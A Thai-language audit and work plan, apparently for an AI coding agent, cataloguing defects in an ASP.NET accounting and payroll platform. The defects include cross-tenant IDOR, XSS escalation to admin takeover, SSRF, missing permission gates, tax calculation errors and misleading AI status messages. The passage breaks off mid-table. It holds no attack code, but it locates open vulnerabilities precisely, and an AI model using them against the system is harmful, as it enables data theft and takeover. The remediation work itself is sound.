# SYSTEM REVIEW 2026-09 — ผลตรวจทั้งระบบโดยทีมผู้เชี่ยวชาญ 8 ด้าน

> เอกสารนี้คือ **ลิสต์งานสำหรับ agent รอบถัดไป (Opus)** ให้พัฒนาต่อได้โดยไม่ต้องสำรวจซ้ำ
> ผลิตจากการอ่านโค้ดจริงโดย 8 ทีมขนาน (ทีมละ ~60–110 tool call · รวม ~2.8M token)
> แล้ว **main agent เปิดไฟล์ verify ทุกข้อ P0/P1 ซ้ำอีกรอบ** (ระบุไว้ต่อท้ายชื่อทีม)
> ตามกติกา CLAUDE.md "ผลตรวจจากทีม/agent ต้อง verify ก่อนเชื่อ — มันผิดได้ทั้งสองทาง"

- วันที่ตรวจ: 2026-09-02 · commit ฐาน: `a6a8ec5` (branch `claude/fix-errors-638kW`)
- ขอบเขต: ASP.NET Core 8 backend (137 controller · 186 service · 107k บรรทัด) + wwwroot 160 หน้า
- **ไม่ได้รันโค้ด/คอมไพล์** (env ไม่มี .NET SDK) — ทุกข้อมาจากการอ่าน + grep ยืนยัน call site + simulation Python/node
- ข้อที่ระบุ `สงสัย` = ยังไม่ได้ไล่ครบ ต้องเช็คตามที่ระบุก่อนลงมือ

## วิธีใช้เอกสารนี้ (สำหรับ Opus)

1. **ทำตาม CLAUDE.md ทุกข้อ** — โดยเฉพาะ: แก้บั๊กที่ผู้ใช้เจอต้อง reproduce เป็นเทสต์/simulation ก่อน · logic เงิน/ภาษีต้อง extract เป็น pure class + เทสต์ · checker ใหม่ต้องผ่าน negative test · อัปเดต DOCUMENT_FLOW/ACCOUNT_STRUCTURE/TEST_PLAN ในคอมมิตเดียวกัน · รัน `tools/*.py` 21 ตัว + `node --check` + brace balance ก่อน commit · บอกผู้ใช้ทุกครั้งว่า "ยังไม่ได้คอมไพล์ รบกวน rebuild ฝั่งคุณ"
2. **แก้ตาม "ราก" ไม่ใช่ตาม "อาการ"** — หลายข้อในลิสต์มีต้นเหตุร่วมกัน (ดู §2) แก้ที่รากหนึ่งครั้งปิดได้หลายข้อ และกันตัวที่สาม
3. **ทุกข้อ P0 มีผลต่อเงิน/ภาษี/กฎหมาย/ข้อมูลข้ามบริษัท** — ลำดับที่แนะนำอยู่ใน §3 (จัดเป็น sprint ที่คอมมิตเดียวปิดหลายข้อ)
4. **ห้ามรายงานซ้ำสิ่งที่อยู่ใน §9 "ตรวจแล้วไม่ใช่บั๊ก"** — ทีมเสียเวลากับสิ่งเหล่านี้ไปแล้ว
5. รหัส ID: `A-` เอกสาร · `B-` onboarding/nav · `C-` บัญชี/ภาษี · `D-` payroll · `E-` OCR/AI · `F-` security/arch · `G-` frontend · `H-` โมดูลรอง

ระดับ: **P0** เงิน/ภาษี/กฎหมาย/ข้อมูลเสีย/รั่วข้ามบริษัท · **P1** ฟีเจอร์พังหรือใช้ไม่ได้ · **P2** UX ติดขัดจริง/hardening · **P3** ความเรียบร้อย · ขนาด **S** <2 ชม. · **M** ครึ่ง–1 วัน · **L** หลายวัน

---

## §1 สรุปผู้บริหาร — 20 ข้อที่ต้องแก้ก่อน (เรียงตามความเสียหาย)

| # | ID | ข้อ | ทำไมถึงอันดับนี้ | ขนาด |
|---|---|---|---|---|
| 1 | F-02 | `GET/POST /api/Subscription/payments/{paymentId}` ไม่มี companyId ⇒ guard ข้าม ⇒ อ่าน/เขียนทับสลิปชำระเงินของ**บริษัทอื่น**ได้ด้วย GUID เดียว | รั่วข้ามผู้เช่า ยิงได้ทันที | M |
| 2 | ✅(G-01) F-01 + G-01 + G-04 | XSS เชิงระบบ: `Layout.esc` ไม่หนี `"`/`'` (82 จุดใน attribute) · admin console ต่อชื่อผู้ใช้/ชื่อบริษัท/หมายเหตุสลิปดิบ 114 จุด · สมัครสาธารณะไม่ validate `FullName` · CSP `unsafe-inline` · JWT ใน localStorage ⇒ ผู้เช่า→ยึด SystemAdmin | takeover แพลตฟอร์ม | S (esc) + M (admin) |
| 3 | ✅ A-D2 + D-A1 + D-A2 | endpoint เขียนของ Document (PUT/DELETE/convert/payments/write-off) และ Payroll (create/approve/**pay**/settle-sso/sync) ไม่มี permission gate — สมาชิกคนไหนก็ได้ลง JE/จ่ายเงินเดือน | สิทธิ์ | M+S |
| 4 | ✅ A-D1 | ฟอร์มสร้างเอกสารไม่ส่ง `currency/exchangeRate` เลย ⇒ ใบสกุลต่างประเทศทุกใบจาก UI ลงบัญชีเป็นบาท rate 1 | เงิน/ภาษีผิดเป็นเท่าตัว | S |
| 5 | C-T02 + C-T03 | ปิดงวด**รายเดือน**สร้าง closing entry ⇒ P&L ของงวดที่ปิดกลายเป็น 0 (ไหลไป XBRL DBD + ภ.ง.ด.51) · YearEndClose ตรึง ม.ค.–ธ.ค. ไม่อ่าน FiscalYearStartMonth | งบการเงินที่ยื่นผิด | M+S |
| 6 | ✅ d77a56a+ C-T01 | ภ.พ.30 กรอง `VatAmount != 0` ⇒ ยอดขาย 0% (ส่งออก) และยกเว้นไม่เคยเข้ารายงาน · ซื้อยกเว้นปนเป็นยอดขาย | §80/1 §81 §87 | M |
| 7 | E-OCR-01 | OCR ใส่ VatRate = 7 ทุกบรรทัดถ้าใบมี VAT + เฉลี่ย VAT ตามยอด ⇒ ใบผสม 7%/ยกเว้น (Makro/BigC/บิลอาหาร) รายงานภาษีซื้อผิดทุกใบ ยอดรวมตรงจึงเงียบ | §87 งานประจำวัน | L |
| 8 | D-T1..T4 | PIT: ไม่หักค่าใช้จ่าย 50%/100,000 (§42ทวิ) · ลดหย่อน 8 ฟิลด์ไม่มีจุดเขียน · โบนัสถูกคูณรายปี · เข้ากลางปีหักพุ่ง 25% เดือนสุดท้าย — เงินเดือน 50,000 หัก 31,925 ควร 20,450 (คู่สมรส+บุตร 2 ควร 6,475 = 4.9×) | พนักงานทุกคนทุกเดือน | S+M+M+M |
| 9 | D-F1 + D-S1 + D-S2 + D-S3 | สร้างรอบเงินเดือนจากหน้าจอ**พังทุกครั้ง** (ส่ง พ.ศ. + ไม่ส่งงวด) · พนักงานที่เพิ่มจาก payroll.html ไม่เข้า ปกส. เงียบ · ลาออกกลางเดือนหายจากรอบ · ไม่ prorate | ม.33 ม.5 | S+S+S+M |
| 10 | ✅ แก้ไปก่อนหน้าแล้ว H-A1 | `quick-sale.html` เรียก `Layout.toDateInput` แต่ไม่โหลด layout.js ⇒ ขายเร็วขายไม่ได้เลย (มีเมนู + ปุ่มมือถือ) | ผู้ใช้เจอทุกวัน · 1 บรรทัด | S |
| 11 | H-A2 + H-A3 | ใบแจ้งหนี้ Time Billing VAT=0 ตายตัว · POS ใช้ UtcNow ⇒ ขาย 00:00–07:00 ตกวัน/เดือนก่อน (ภ.พ.30 ผิดงวด) | เงิน/ภาษี | M+S |
| 12 | ✅ E-AI-01 | `ToResult` ส่ง `RawResponseJson` ที่ local path เป็น null เสมอ ⇒ student ที่เขียนเพื่อ kill-switch ถูกทิ้ง ผู้ใช้เห็น "🤖 AI ตรวจสอบเสร็จ" + แผงว่าง (3 feature) | ละเมิดกฎเหล็ก #1 · 1 บรรทัด | S |
| 13 | ✅ E-AI-02 + E-AI-03 | budget guard นับ heuristic/memory เป็น call จริง ⇒ daily cap เต็มแล้วบล็อก AI จริง · รายงานการใช้ AI นับ call ที่ไม่เคยเกิด · memory hit บันทึก ProviderUsed=DeepSeek | ต้นทุน + ตัวชี้วัดโกหก | S+S |
| 14 | F-06 | DataProtection key ring บนดิสก์ท้องถิ่น `./.dpkeys` ⇒ replica ที่ 2 ถอด PII ไม่ออก / restart ไม่มี volume = เลขบัตร ปชช. หายถาวร | **ต้องแก้ก่อนขึ้น replica ที่สอง** | M |
| 15 | F-08 + F-09 | ตัวออกเลข ~25 จุด `Max()+1` ไม่มี advisory lock ไม่มี unique index (JE/Payment/POS/50ทวิ) · background job 11/12 ไม่มีล็อกข้าม instance | เลขซ้ำ/JE ซ้ำ/อีเมลซ้ำเมื่อ scale | L+M |
| 16 | H-A4 | จุดสร้าง ApiKey ไม่เคยเซ็ต `Scopes` แต่ `/api/v1` ปฏิเสธคีย์ที่ไม่มี scope ⇒ ผลิตภัณฑ์ Connected ทั้งก้อนใช้ไม่ได้ + UsageEvent 0 แถวตลอดกาล (ไม่มีวัน metering) | รายได้ | M |
| 17 | F-03 + F-04 + F-05 | อัปโหลด `.html/.js/.svg` ลง `/uploads/cms` ที่เสิร์ฟสาธารณะ (ล้ม CSP self) · webhook URL ไม่ validate = SSRF (metadata/VPC) · สิทธิ์ ApiKey Can* เขียนลง HttpContext.Items แต่ไม่มีใครอ่าน (read-only key เขียนได้เต็ม) | security | M+M+S |
| 18 | B-A1 + B-A2 + B-A4 | หน้าแรกหลังล็อกอิน (simple) ไม่มี layout ⇒ skeleton ค้าง + ไม่มี selector บริษัท · CTA "สร้างเอกสาร" ทุกปุ่มบนแดชบอร์ด + step 8 ของ checklist ใช้ `?create=` ที่ไม่มีใครอ่าน · simple sidebar ไม่มีทางบันทึกบิลซื้อ | ผู้ใช้ใหม่ทุกคน | M+S+M |
| 19 | C-T05..T09 | WHT ฿1,000 สะสม (มี helper ไม่มีใครเรียก) · wht.html สำเนามือ 6/11 ประเภท อัตราไม่เปลี่ยน · ใบย่อ §86/6 ไม่ gate ภ.พ.06 · ไม่มี ภ.ง.ด.50 · บริจาค cap 2% ไม่เคยคำนวณ | compliance | M×5 |
| 20 | H-A13 | ผู้เช่าใหม่ไม่มี `NotificationSettings` ⇒ ระบบแจ้งเตือนทั้งก้อนเงียบสนิทตั้งแต่วันแรกโดยไม่มีอะไรบอก | cold-start | M |

---

## §2 ต้นเหตุร่วม (defect class) — แก้ที่รากปิดได้หลายข้อ

| ราก | ข้อที่เป็นอาการ | กลไกที่แก้ให้จบ (ไม่ใช่แก้ทีละอาการ) |
|---|---|---|
| **R1 สำเนามือที่ drift** — รายการ/ตาราง/ตรรกะที่คัดลอกจากแหล่งจริง | A-D5 (`_expenseDocTypes` ไม่มี GRN) · B-A4/A6/A7/A8 (SIMPLE_ALLOWED, settings-features MENU_GROUPS, command-palette) · C-T06 (wht.html อัตรา) · C-T03 (FiscalYear 4 ที่ 1 ที่ลืม) · D-U1 (2 ฟอร์มพนักงาน) · D-W3 (จอ≠ไฟล์) · D-R4 (deadline 3 ที่) · G-06 (esc 36 ชุด) · G-fmt (เงิน 131/พ.ศ. 37) | ทุกอย่างสร้างจากแหล่งเดียวตอน runtime หรือ helper ตัวเดียวใน `Helpers/`/`js/` — ลบสำเนาทิ้ง ห้ามซิงก์ |
| **R2 ของที่มีแต่ไม่มีใครเรียก** — control/feature เขียนเสร็จแล้วสายขาดหนึ่งบรรทัด | E-AI-01 (ToResult) · E-parity (8 enum ตาย · 25 heuristic ป้าย AI) · E-OCR-02 (VatTypeInference ไม่ถูกเรียกจาก OCR) · C-T05 (ShouldWithhold) · C-T09 (RD-65ter(7) AddBack=0) · C-T13 (DocumentId ส่งมาแต่ไม่ลิงก์) · D-W1 (Employee.TaxId ไม่มีจุดเขียน) · D-T1/T2 (Section42TwiCap + ลดหย่อน 8 ฟิลด์ read-only) · F-05 (ApiKey Can*) · H-A4 (Scopes) · H-A12 (ECommerce ไม่มี UI) · H-A15 (JE ไม่ติด BranchId) · B-A5/A23 (review-queue, manifest) · G-07/08/09 (api.js 101 เมธอด, layout.js 6 ฟังก์ชัน) | ก่อนเพิ่มอะไรใหม่ grep call site ของที่มีอยู่ก่อน · ทุกตัวในลิสต์ต้อง**ตัดสินใจอย่างตั้งใจ: ต่อสาย หรือ ลบ** ห้ามปล่อยไว้ |
| **R3 ด่านสิทธิ์ไล่ไม่ครบทุกทางเข้า** | A-D2 (Document 12 endpoint) · D-A1/A2 (Payroll 9 endpoint) · F-02 (guard ข้ามเมื่อ route ไม่มี companyId) · C-T04 (7 เส้นโพสต์เข้างวดปิดได้) · C-T12 (§82/5 screener เฉพาะ OCR) · F-13 (ลายเซ็นคนอื่น) | ยกด่านขึ้นเป็น attribute/filter เชิงโครงสร้าง: `[DocPermission]` · `[NonTenantScoped]` (กลับด้าน guard ให้ปฏิเสธ default) · `ResolveOpenFiscalPeriodAsync` ที่ throw · แล้วเขียน checker แบบ `admin_menu_gate_check` |
| **R4 silent no-op / ค่า default ที่แต่งขึ้น** | A-D3/D4/D6/D7/D12 (เมธอด/id ที่ไม่มีจริง) · A-D9 (PUT field เดียวไม่เปลี่ยน) · B-A2/A3/A8/A9/A12 · D-S6 (ReasonCode=1 ตายตัว) · E-OCR-03 (`?? "00000"` + confidence 95%) · G-11 (catch → สมมติจด VAT) · G-10 (bulk approve กลืน error) · H-A5 (Open Banking sync ปลอม) · H-A11 (e-commerce Success=0 ตลอด) · H-A17 (XLSX ได้ CSV) · H-A18 (ไม่มีบัญชีขาย → return เงียบ) | "ไม่รู้ = บอกว่าไม่รู้" · ด่านที่ล้มต้อง fail loud 3 ที่ (ข้อมูล/สถานะ/คำตอบ) · checker "เมธอด/id ที่ถูกเรียกแต่ไม่นิยาม" + "query param ที่ส่งแต่ไม่มีใครอ่าน" |
| **R5 state ข้าม request ใน process** | F-06 (dpkeys) · F-07 (migration ไม่มีล็อก) · F-08/F-09 (เลข/job) · F-10/F-11/F-14 (rate limit/chat dict) · E-AI-07/08 · H-A21 | ยกออกจาก process ทั้งหมดก่อนขึ้น replica ที่สอง — `IdempotencyMiddleware` (DB) เป็นแม่แบบ |
| **R6 ตารางกฎหมาย/ตัวเลขที่ยังไม่มีเทสต์** | D-R2 (PIT 470 บรรทัดไม่มีเทสต์) · C-T14/T16 (ปัดเศษ) · D-S4/S5/X5 (ยังไม่ verify กฎหมาย) | pure class ใน `Helpers/` + เทสต์ที่ล็อกตัวเลขจริง ก่อนแตะสูตร |

---

## §3 ลำดับลงมือที่แนะนำ (คอมมิตเดียวปิดหลายข้อ)

**Sprint 0 — ปิดช่องรั่ว/ยึดระบบ (1–2 วัน)**
1. F-02 IDOR Subscription payments → ย้ายใต้ `{companyId}` + ITenantGuard ในบริการ · แล้วทำ **R3 กลับด้าน guard** (`[NonTenantScoped]` explicit) + grep รายการ
2. G-01 แก้ `Layout.esc` ให้หนี 5 อักขระ (ลบ `_esc`) — 1 จุดปิด 82 · เพิ่ม `esc` ใน `admin-layout.js` + ไล่ admin/payments, customers, users (68/114 จุด) · validate `FullName`/`Company.Name` (max-length + strip tag) · G-05 app.html 5 จุด
3. ✅ A-D2 + D-A1 + D-A2 ใส่ permission gate ครบแล้ว (**Document 20 · Payroll 30** — มากกว่าที่รายงานไว้ เพราะไล่ทุก [HttpPost/Put/Delete] ไม่ใช่เฉพาะที่ระบุ) ผ่าน `DenyDocAsync`/`DenyKeyAsync` + `RequirePayrollWriteAsync`/`RequireAnyAsync` + `tools/write_permission_gate_check.py` (checker ตัวที่ 26) · ยังค้าง: F-13 ลายเซ็น `UserId ==` + F-05 ApiKey Can* filter global
4. F-03 upload allow-list จาก magic bytes + `nosniff` + `Content-Disposition` บน `/uploads/**` · F-04 SSRF validate URL + ปิด redirect · F-16 `/health/db` gate · H-A6 OPENBANKING key fail-fast

**Sprint 1 — เงิน/ภาษีที่ผิดอยู่ตอนนี้ (3–5 วัน)**
5. ✅ A-D1 currency/exchangeRate ใน save() + `_hydrateCurrencyReadonly` ตอน openEdit (ล็อก+บอกเหตุผล เพราะ `UpdateDocumentRequest` ไม่รับสองช่องนี้) · ตรวจแล้ว: `ToGlAmount` (:12192) คูณอัตราถูกต้อง และ renderer ทั้งสองตัวพิมพ์สกุล/อัตราอยู่แล้ว (PdfGenerationService:1786 · DocumentRenderer:683)
6. C-T02/T03/T04: `IsClosingEntry` + กรองที่ resolver กลาง · CloseFiscalPeriod ทำแค่ล็อก · `Helpers/FiscalYear.RangeFor` · `ResolveOpenFiscalPeriodAsync`
7. C-T01: predicate + Pp30Box enum (R5 ของทีม C) + แยก exempt sales/purchases
8. D-R2 `Helpers/ThaiPitCalculator` pure + เทสต์ 4 ระดับ → แล้วแก้ D-T1/T2/T3/T4 บนตัวนั้น · D-T2 เพิ่ม 8 ฟิลด์ใน DTO+ฟอร์ม
9. D-F1 + D-S1 + D-S2 + D-S3 (+ D-W1, D-W4, D-D1, D-X4)
10. H-A1 (1 บรรทัด) · H-A2 TimeBilling ผ่าน CreateDocumentAsync · H-A3 ThaiDate ใน POS · H-A18 throw · H-A16 dropdown ลูกค้า

**Sprint 2 — AI/OCR ตามกฎเหล็ก #1/#3 (3–4 วัน)**
11. ✅ E-AI-01 (`LocalPrediction.StructuredJson` + `AiRequest.LocalRawJson` + ต่อสาย 3 จุดใน orchestrator + `OcrFullReviewDistillationModel` ส่งโครงออกมา + toast/หัวแผงซื่อสัตย์ตาม `usedAi`) · ✅ E-AI-02+03 (`AiCallStatus.LocalServed` + 27 จุดที่ต้นทาง + `Helpers/AiCallBilling` ตัวตัดสินตัวเดียว + migration ล้างแถวเก่า + `AiAccuracy30d` หารด้วยจำนวนครั้งที่ AI ตอบจริง) · ยังค้าง: E-AI-07 advisory lock training job
12. E-OCR-01 + OCR-02: VatRate เป็นพลเมืองชั้นหนึ่งของ pipeline (entity→JSON→DTO→review) + VatTypeInference ต่อบรรทัด + ด่าน Σ
13. E-AI-06 sanitizer (email/bank regex · `_pii` producer จริง · AllowTaxIdInPrompt แยกนิติบุคคล) · E-OCR-03/04/05 · E-AI-10 enum ตาย 8 ค่า ตัดสินใจ

**Sprint 3 — ผู้ใช้ใหม่/nav/หน้าแรก (2–3 วัน)**
14. B-R1 ยุบสองแดชบอร์ดเหลือ `/app.html` (ปิด B-A1/A15/A19/A24/A16/A4/A11/A22 พร้อมกัน) — หรืออย่างน้อย B-A1 ให้ simple โหลด layout.js
15. B-A2/A3/A8 query param ที่ไม่มีใครอ่าน · B-A5/A9 ไฟล์ที่ไม่มี · B-A6 settings-features จาก navItems · B-A12 checklist เขียวเสมอ · B-A17 sub-page ใน navItems · B-A13/A14 i18n nav
16. A-D3/D4/D5/D6 (เมธอด/id ผี, GRN) · A-U1 ปุ่มรับเงินในแถว · A-D13 GRN profile

**Sprint 4 — multi-instance readiness (ก่อน scale)**
17. F-06 dpkeys → shared store + round-trip test · F-07 migration: advisory lock + schema version + CONCURRENTLY + แยกออกจาก startup · F-08 `SequenceGenerator.NextAsync` ตัวเดียว + unique index 4 คู่ · F-09 ล็อกทุก job · F-10/F-11/F-14 ยก state ออกจาก process

**Sprint 5 — compliance ที่ยังไม่มี**
18. C-T05 ฿1,000 สะสม · C-T06 wht.html จาก endpoint + ภ.ง.ด.2/54 · C-T07 IsRetailApproved/PhoR06 (+H-A20 POS) · C-T08 ภ.ง.ด.50 · C-T09 บริจาค 2% · C-T10 ปฏิทิน+PublicHolidays · C-T11 retention max() + migration · C-T12 screener ทุกทางเข้า · C-T18 ค่าเผื่อหนี้ · C-T19 (1.8 ล. · 3 วันทำการ · เงินเพิ่ม 20%) · D-S5/S6/S7 · D-U2 ไฟล์โอนธนาคาร

**Sprint 6 — re-design ก้อนใหญ่ (ประเมินแยก)**
19. H-R3 ชั้นสต๊อกทางเข้าเดียว (`IStockPostingService`) — ปิด H-A8/A9 · H-A15 BranchId เข้า JE · H-A4 Connected API onboarding form · H-A12 ตัดสินใจ E-commerce (ทำ UI หรือลบ) · H-A5 ซ่อน Open Banking
20. G-R component ชั้น 0–4 (`esc.js` → `fmt.js` → `ui.js` → `table.js` → `form.js`) ทีละหน้า · A-R1 field map เดียวของฟอร์มเอกสาร · A-R3 ลบ renderer สำรอง client · D-R1 ยุบฟอร์มพนักงาน · D-R5 SettlePayrollLiability generic

---

## §4–7 ผลตรวจรายทีม (ID ในตารางไม่มี prefix — อ้างอิงเป็น `<ทีม>-<ID>` เช่น A-D1, C-T01, F-02, G-01, H-A4)

# ทีม A — วงจรเอกสาร (verified by main: D1,D2,D3,D4,D5,D6,D9 ✔)

| ID | ระดับ | file:line | อาการ | ผลกระทบ | แก้ | ขนาด |
|---|---|---|---|---|---|---|
| D1 | P0 | documents.html:651-666 (ช่อง) · 8183-8362 (payload) · 6135 (CN สืบทอด) | `save()` ไม่ส่ง `currency`/`exchangeRate` เลย (grep บล็อก 7962-8607 = 0) → Create ใช้ default THB/1 · `openEdit` ไม่ hydrate `fCurrency` | ใบสกุลต่างประเทศทุกใบจากหน้าเว็บ (รวมเส้น OCR 1936-1941 และ CN ที่ตั้งใจสืบทอด) ลงบัญชีเป็นบาท · DocumentCloneController:135 ส่งถูก = ผลต่างตามทางเข้า | เพิ่ม 2 คีย์ใน payload + hydrate ใน openEdit + เทสต์ยืนยันใบ USD จาก UI ได้ Currency=USD · ตามด้วยเช็ค AutoPost ToGlAmount (DocumentService:11886) และ PDF พิมพ์สกุล/อัตรา | S |
| D2 | P0 | DocumentController.cs:269 PUT · 786/801 DELETE · 853/889/912 convert/partial/batch · 1042 payments · 1060 void-payment · 935 write-off · 836 billing-note · 963/996/1003 contacts | มีแค่ `[Authorize]` คลาส ไม่มี `DocumentPermissionHelper` ต่างจาก POST:262 / Approve:530 / Void:668 ที่มีครบ (TenantGuardFilter ตรวจแค่สมาชิก) | role ที่มีแค่ View แก้/ลบใบร่าง · แปลง PO→PI = สร้างชนิดที่ถูกกัน · บันทึก/ยกเลิกชำระเงิน (ลง JE) · ตัดหนี้สูญ · คอมเมนต์ :646-650 บอกว่ารอบก่อนปิดไป 1 จุด = "แก้ตัวเดียว เหลือที่เหลือ" | PUT/DELETE=CanCreate(docType) · convert=CanCreate(source)+CanCreate(target) · payments/void-payment/write-off=CanApprove · contacts=สิทธิ์ contact · ระยะยาว R2 attribute + checker | M |
| D3 | P1 | documents.html:9742 `this.edit(` · 8965 `Page.edit(` | `Page.edit` ไม่มีนิยาม (สแกน 301 เมธอด) | ปุ่ม 📋 คัดลอก: clone สำเร็จแต่ใบใหม่ไม่เปิด (TypeError เงียบใน setTimeout) · ลิงก์ "แก้ไขใบนี้" ในแบนเนอร์ใบซื้อไม่มี VAT ปิด modal แล้วจอว่าง = เส้นเคลมภาษีซื้อตัน | เปลี่ยนเป็น `openEdit` + เพิ่ม checker "เมธอดที่ถูกเรียกแต่ไม่นิยาม" ใน tools/ | S |
| D4 | P1 | documents.html:3138, 3176, 3287 | `if (typeof this.viewDetail === 'function')` — ไม่เคยนิยาม ⇒ เท็จเสมอ | หลัง "หักมัดจำ" 3 ทาง หน้ารายละเอียดไม่รีเฟรช ยอดค้างชำระค้างค่าเดิม ผู้ใช้กดซ้ำ | เปลี่ยนเป็น `this.detail(this.editingId)` ลบ guard typeof ที่กลบบั๊ก | S |
| D5 | P1 | layout.js:2345 `_expenseDocTypes` ไม่มี GoodsReceiptNote · documents.html:185 มีแท็บ · load():6573/6592 กรองสองชั้น · loadPeriods:6751 · exportAll:6357 | กด "ฝั่งรายจ่าย"/เมนู ?side=expense → ใบรับสินค้าหายทั้งหมด + งวด/export ขาด | สาย PO→GRN→PI ใช้ไม่ได้จากฝั่งรายจ่าย | เติม GRN · ระยะยาว generate ลิสต์จากแท็บใน DOM (กลไกเดียวกับ MENU_SECTIONS) | S |
| D6 | P1 | documents.html:6241-6255 อ่าน `fSubTotalDisplay/fSubTotal/fVatAmountDisplay/fVatAmount` (ไม่มี id ทั้ง 4 — ของจริง `#sumSubTotal/#sumVat`) · ข้อความสัญญา :1092-1094 | กล่อง "ข้อมูลใบกำกับภาษีของผู้ขาย" โหมดกรอกเอง แสดง "— เพิ่มรายการเพื่อคำนวณ —" ตลอด (sub=0,vat=0) | เส้น OCR ใช้โหมดนี้เสมอ (:1896-1901) ⇒ ไม่มีตัวเลขให้กระทบยอดก่อนเคลมภาษีซื้อ | ให้ `calcSum()` เก็บ `this._sums` แล้วอ่านที่เดียว + เรียก `_updateTaxInvVatPreview()` ท้าย calcSum | S |
| D7 | P2 | documents.html:11410-11413 vs 11449 | `downloadHtmlPdf()` หา `#pdfPrintArea` ซึ่งมีเฉพาะ renderer สำรอง client → เส้นปกติ `return` เงียบ | ปุ่ม "📄 ดาวน์โหลด HTML" ไม่ทำอะไรเลย | ห่อ `#pdfContent.innerHTML` หรือถอดปุ่ม (เลือกอย่างตั้งใจ) | S |
| D8 | P2 | documents.html:11424-11551 | renderer สำรอง client: หัวใช้ `docTypeLabel` ไม่ใช่ `documentTitle` · hardcode "7%" · ไม่มีรหัสสาขา §86/4 · ไม่มีส่วนลดท้ายบิล/สกุล · ประทับลายเซ็น "ผู้อนุมัติ" ของคนที่แค่เปิดดู (:11536) · วันที่ = วันนี้ (:11447) | renderer ตัวที่ 3 ที่ drift — เมื่อ /generate-html ล่ม ผู้ใช้พิมพ์ใบผิดกฎหมาย | ลบทิ้ง + error+ปุ่มลองใหม่ (R3) หรืออย่างน้อยใช้ documentTitle/ตัดลายเซ็น/แบนเนอร์ "พรีวิวสำรอง" | M |
| D9 | P2 | DocumentService.cs:2202-2210, 2338-2362 | `PricesIncludeVat/BrandId/BranchId/DocumentTemplateId/PaymentType` + recompute Paid/Balance อยู่ใน `if (request.Lines != null)` | integration ที่ PUT เฉพาะ field เดียวได้ 200 แต่ไม่เปลี่ยน (คลาสเดียวกับที่แก้ DimensionId :2172) | ยก 5 assignment ออกนอกบล็อก Lines (PricesIncludeVat ต้องตั้งก่อนคำนวณบรรทัด) | S |
| D10 | P2 | layout.js:1993-2000 | Escape ปิด modal บนสุดทันที ไม่มี confirm/autosave/beforeunload (grep=0) | ฟอร์มเอกสารยาวสุดในระบบ กด Esc ผิด = พิมพ์ใหม่ทั้งใบ | `data-confirm-close` + dirty check ที่ handler กลาง | S |
| D11 | P2 | DocumentService.cs:14819-14827 · wwwroot ไม่มีใครอ่าน `isRedacted` | เอกสาร Sensitivity ถูก redact เป็น Contact "[ซ่อน]" ยอด 0 แต่ list วาดเป็นแถวปกติ ฿0.00 | export/รวมยอดได้ตัวเลขปลอม | badge 🔒 + ยอด "—" + ปุ่มดูโชว์ redactedReason | S |
| D12 | P2 | documents.html:9433 `fReferenceDocumentId` ไม่มี | AI แนะนำเหตุผลใบลดหนี้ได้ `originalInvoiceId=null` เสมอ ทั้งที่มี `_cnSourceId`/`relatedDocumentId` | คำแนะนำ §86/10 ขาดบริบท + feedback สอน local model ผิด | ส่ง `this._cnSourceId || _currentDoc?.relatedDocumentId` | S |
| D13 | P2 | documents.html:5085-5106 `_docFieldProfile` ไม่มี GRN · 343-364 fDocType ไม่มี option GRN · 7594 | เปิดแก้ใบรับสินค้า: ช่องประเภทว่าง (selectedIndex=-1) ตกไป profile default โชว์ครบกำหนด/เครดิต/แหล่งเงิน | ฟอร์มชวนกรอกของที่ไม่มีความหมาย | option hidden GRN + แถว profile GRN | S |
| D14 | P2 | DOCUMENT_FLOW.md:67-68,446,715,808,1017,1041 | endpoint เขียน `/documents` (จริง `/document` DocumentController:16, api.js:211) · file:line ผิดทั้ง 5 จุดที่สุ่ม (เพี้ยนหลักพันบรรทัด) | ละเมิด hard requirement ของ CLAUDE.md เอง · integration ยิงผิด path | แก้ path + ใช้ชื่อเมธอดแทนเลขบรรทัด หรือสคริปต์ verify เลขบรรทัดก่อน commit | S |
| D15 | P3 | documents.html:10465 `_offerIssueReceipt` · 9575 `sendEtaxEmailOneClick` · 11375/9694 `downloadEtaxPdf*` | นิยามอย่างเดียว ไม่มี call site | โค้ดตายที่อ่านว่า "มีฟีเจอร์" | ลบ 3 ตัว · ต่อสาย `_offerIssueReceipt` เป็นปุ่ม "ออกใบเสร็จให้ลูกค้า" | S |
| D16 | P3 | documents.html:6588-6597 | เปลี่ยนตัวกรองแล้วแถวเดิมค้าง ไม่มี loading · empty state ไม่มีปุ่มสร้าง | | skeleton + empty CTA | S |
| D17 | P3 | documents.html:10377-10378 | removeEventListener ด้วย closure ใหม่ ⇒ handler สะสม | | เก็บ reference / oninput | S |

## UX / กระบวนการ
- U1 (S): ไม่มีปุ่ม "รับเงิน" ในแถวรายการ (:6706-6714) ทั้งที่เงื่อนไขมีครบใน detail (:9198-9209) → งานที่ทำบ่อยสุดกิน 4 คลิก 2 modal ลดเหลือ 2 คลิกได้
- U2 (S): flow "บันทึกและอนุมัติ" (:8509-8562) ทำ approve+หักมัดจำ+ชำระ+หัวรวมในคลิกเดียวจริง แต่ป้ายปุ่มไม่บอก → เปลี่ยนป้ายตามโหมดกระดาษ
- U3 (M): dropdown ประเภทเอกสาร 20 ตัวเลือก 5 กลุ่ม (:273-305) · 3 ตัวต่างแค่ลำดับคำบนหัว → แทนด้วย 2 คำถาม "รับเงินหรือยัง / ลูกค้าขอใบกำกับไหม" map เข้า `_PAPERS` (:3832-3854)
- U4 (M): แบนเนอร์ในหน้ารายละเอียดซ้อนได้ 9 ก้อน (:8702-8996) → ยุบเป็น "⚠️ N เรื่องต้องจัดการ" กางได้
- U5 (S): ปุ่ม "นำเข้าสต๊อก" มา async แล้ว re-layout แถบปุ่ม (:9289-9301) ปุ่มขยับใต้เมาส์
- U6: เอกสารลูกสืบทอดครบ (convert/clone/CN) ยกเว้นสกุลเงินเพราะ D1

## Re-design
- R1 (L): field map เดียว `[{id,key,clearWith,visibleFor}]` ให้ openCreate/openEdit/save เดินจากตัวเดียว — save() 650 บรรทัด 60 คีย์ 8 IIFE 3 sentinel คือต้นเหตุ D1
- R2 (M): `[DocPermission(DocAction.X)]` attribute + checker (แม่แบบ admin_menu_gate_check)
- R3 (M): ลบ renderer สำรอง client (generatePdfHtml 130 บรรทัด)

## ยังไม่ได้อ่าน: documents.html 4260-5010, 5440-6560, 6790-6900, 7150-7336, 9500-9728, 10530-10925 · PdfGenerationService ทั้งไฟล์ · DocumentService อีก ~12k บรรทัด (Approve เต็ม/AutoPost/Void/Convert core)


# ทีม B — Onboarding/Nav/Settings (verified by main: A1,A2,A3,A5,A6,A9 ✔)

| ID | ระดับ | file:line | อาการ | ผลกระทบ | แก้ | ขนาด |
